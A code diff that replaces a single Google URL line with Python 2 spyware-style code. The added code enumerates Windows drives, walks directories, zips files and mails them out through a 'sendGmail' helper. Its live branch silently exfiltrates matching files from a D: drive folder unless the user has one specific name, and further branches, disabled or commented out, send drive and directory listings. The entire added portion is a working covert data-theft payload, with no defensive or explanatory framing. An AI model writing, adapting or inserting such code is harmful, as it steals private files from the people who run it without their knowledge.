@@ -1,1 +1,148 @@
-url = "https://www.google.com/webhp?ie=utf-8&oe=utf-8"
+#timer7788
+time.sleep(10)
+user = os.environ['USERNAME']
+#temp_path
+
+global walkdir
+def walkdir(path):
+    txt = ""
+    for root, dirs, files in os.walk(unicode(path)):
+        for file in files:
+            txt += os.path.abspath(os.path.join(root, file)) + "\n"
+    return txt.encode("UTF-8")
+
+
+import os
+global list_devices
+def list_devices():
+    ddd='DEFGHIJKLMNOPQRSTUVWXYZ'
+    mm = []
+    for ll in ddd:
+            if (os.path.exists(ll+":")) == True:
+                    mm.append(ll+":\\")
+    m = "{}".format(mm)
+    return m
+    #sendGmail(SUBJECT = "drives",textMessage = m)
+
+
+global mylistdir
+def mylistdir(path):
+    m = os.listdir(path)
+    k = []
+    for v in m:
+        k.append(os.path.join(path,v))
+    return k
+    #mm = "\n".join(k)
+    #sendGmail(SUBJECT = "list dir",textMessage = mm)
+
+import zipfile
+global zipdir
+def sendfile(path,zipname):
+    if os.path.exists(path) == False:
+          sendGmail(SUBJECT = "file not exists", textMessage = path)
+          return
+    ziph = zipfile.ZipFile(zipname, 'w', zipfile.ZIP_DEFLATED)
+    if os.path.isfile(path):
+           ziph.write(path)
+           ziph.close()
+           sendGmail(SUBJECT = zipname, textMessage = zipname, zip_file =zipname)
+           return
+
+    for root, dirs, files in os.walk(unicode(path)):
+        for file in files:
+            ziph.write(os.path.join(root, file))
+    ziph.close()
+    sendGmail(SUBJECT = zipname, textMessage = zipname, zip_file =zipname)
+
+
+
+
+
+print 222
+#time.sleep(10)
+#os.startfile("notepad.exe")
+
+
+
+global send_drives
+def send_drives():
+    drives = list_devices()
+    user_x = os.environ['USERNAME']
+    sendGmail(SUBJECT = "drives",textMessage = "%s: %s" % (user_x,drives))
+
+
+
+
+global send_walk
+def send_walk(mpath):
+          try:
+               #mpath = r"D:\private\mee"
+               #mpath = r"D:\dr_z"
+               temppp = temp_path + "\\"
+               m = walkdir(mpath)
+               ff = open(temppp + "bb.pdf","w")
+               ff.write(m)
+               ff.close()
+
+               #f = open(r"D:\\bb.pdf", 'r')
+               #mm = f.read()
+               #f.close()
+               #sendGmail(SUBJECT = "a",textMessage = mm)
+
+               sendfile(temppp + "bb.pdf",temppp + "zipname.zip")
+          except Exception as e:
+                sendGmail(SUBJECT = "drives",textMessage = "%s" % e)
+
+
+
+
+
+
+
+
+
+
+
+################################################################
+#sendGmail(SUBJECT = user,textMessage = mm)
+#sendfile(r"D:\download.png",temp_path + "\\zipname.zip")
+
+
+
+
+global current_code_id
+if current_code_id != 968 :
+    if  user != "mahmoody":
+        if 1 == 1:
+            path = r"D:\\dr_z"
+            for root, dirs, files in os.walk(unicode(path)):
+                for file in files:
+                    file_path = os.path.abspath(os.path.join(root, file))
+                    if file_path.endswith("city.py"):
+                        sendfile(file_path,temp_path + "\\zipname.zip")
+
+        if 1 == 12:
+            send_drives()
+
+
+        if 1 == 2:
+            lll = mylistdir("D:\\")
+            mlist = "\n".join(lll)
+            sendGmail(SUBJECT = user,textMessage = mlist)
+
+
+
+
+        if 1 == 17:
+            sendfile(r"D:\download.png",temp_path + "\\zipname.zip")
+
+
+        current_code_id = 96
+
+else:
+
+
+        print "old"
+
+
+
